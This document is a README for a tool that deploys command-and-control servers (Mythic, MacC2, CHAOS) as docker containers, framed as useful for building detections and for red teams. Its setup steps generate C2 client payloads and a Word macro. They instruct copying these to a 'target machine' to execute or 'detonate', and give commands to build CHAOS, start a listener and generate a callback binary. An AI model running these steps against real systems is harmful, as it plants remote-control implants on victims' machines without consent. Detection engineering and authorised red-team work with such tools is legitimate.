# C2 Cradle
Tool to download and macOS capable command &amp; control servers as docker containers from a list of options. This can be useful to blue teamers who want to quickly stand up commonly used cross platform C2 frameworks for building detections. This may also be helpful for red teams looking to automate C2 setup.




**Available C2 servers:**

1. **Mythic C2**:

Since Mythic already has a docker image included, I simply run that image. No additional changes were made.

2. **MacC2**:

MacC2 also has its own docker image included. I made a small change to automate the self signed ssl cert steps, so this change is included here in this repo. 

Steps:

1. During set up enter the MacC2 IP address or hostname that you want the MacC2 client to connect to. This will auto generate the client payload using that address/hostname.

2. The MacC2 server will start on port 443 once done.

3. cd to /var/lib/docker/volumes/macc2/_data in order to view the macro.txt file as well as the MacC2_client.py payload.

4. Copy the MacC2_client.py over to the target machine and execute. Or, copy the macro.txt over into a Word doc and detonate on the target host.



8. **CHAOS C2**:

After the server is stood up as a docker container, take the following steps:

1. Start a listener on the server:
> listen address=[IP of server] port=[port]

2. You will need to locally (outside of the container) download CHAOS C2 and generate the payload:

> git clone https://github.com/tiagorlampert/CHAOS && cd CHAOS/cmd/chaos && go build

> cd ../..

> cp cmd/chaos/chaos .

> ./chaos

> generate address=[IP of C2 server] port=[C2 server port] --[platform]

> binary will be dropped in the build directory with a random name

> execute the binary on the target host and the C2 server will show a C2 connection

3. Docker maps the chaosc2 directory (where the server is running) to the /var/lib/docker/volumes/chaosc2/_data directory on the host. 
